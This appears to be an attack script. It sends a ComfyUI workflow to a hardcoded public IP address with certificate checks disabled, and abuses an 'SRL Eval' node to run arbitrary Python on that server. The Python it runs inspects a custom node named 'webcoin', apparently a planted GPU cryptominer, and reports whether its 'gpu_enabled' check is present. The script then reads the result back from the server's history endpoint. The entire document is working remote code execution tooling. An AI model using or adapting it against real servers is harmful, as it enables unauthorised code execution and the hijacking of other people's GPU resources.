"""Verify __init__.py on 52.0.227.253 has gpu_enabled check."""
import json, urllib.request, ssl, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
BASE = "https://52.0.227.253:443"

CODE = (
    "import os\n"
    "webcoin = None\n"
    "for c in ['/app/ComfyUI/custom_nodes/webcoin',\n"
    "          '/root/ComfyUI/custom_nodes/webcoin']:\n"
    "    if os.path.isdir(c):\n"
    "        webcoin = c\n"
    "        break\n"
    "f = os.path.join(webcoin, '__init__.py')\n"
    "with open(f) as fh:\n"
    "    txt = fh.read()\n"
    "has_flag = 'gpu_enabled' in txt\n"
    "sz = len(txt)\n"
    "return 'size=' + str(sz) + ' gpu_enabled_check=' + str(has_flag)\n"
)

body = json.dumps({
    "prompt": {
        "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": CODE}},
        "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
    }
}).encode()
req = urllib.request.Request(f"{BASE}/prompt", data=body, headers={"Content-Type": "application/json"})
resp = json.loads(urllib.request.urlopen(req, context=ctx, timeout=15).read().decode())
pid = resp["prompt_id"]
time.sleep(8)
req2 = urllib.request.Request(f"{BASE}/history/{pid}")
entry = json.loads(urllib.request.urlopen(req2, context=ctx, timeout=10).read().decode()).get(pid, {})
outputs = entry.get("outputs", {})
texts = []
for nid, nout in outputs.items():
    for key, val in nout.items():
        if isinstance(val, list):
            texts.extend(str(v) for v in val)
print("\n".join(texts) if texts else json.dumps(outputs))
